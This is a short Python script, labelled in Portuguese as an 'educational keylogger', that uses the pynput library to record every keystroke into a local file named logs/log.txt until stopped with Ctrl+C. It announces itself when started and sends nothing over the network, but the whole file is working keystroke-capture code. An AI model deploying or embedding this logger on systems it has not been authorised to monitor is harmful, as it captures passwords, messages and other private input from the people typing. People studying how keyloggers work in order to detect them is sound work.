from pynput import keyboard
import os

LOGS = "logs/log.txt"

os.makedirs("logs", exist_ok=True)

print("Keylogger educacional iniciado. Pressione Ctrl+C para parar.")

def on_press(tecla):
    try:
        with open(LOGS, "a") as f:
            f.write(str(tecla.char))
    except AttributeError:
        with open(LOGS, "a") as f:
            f.write(f"[{tecla}]")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
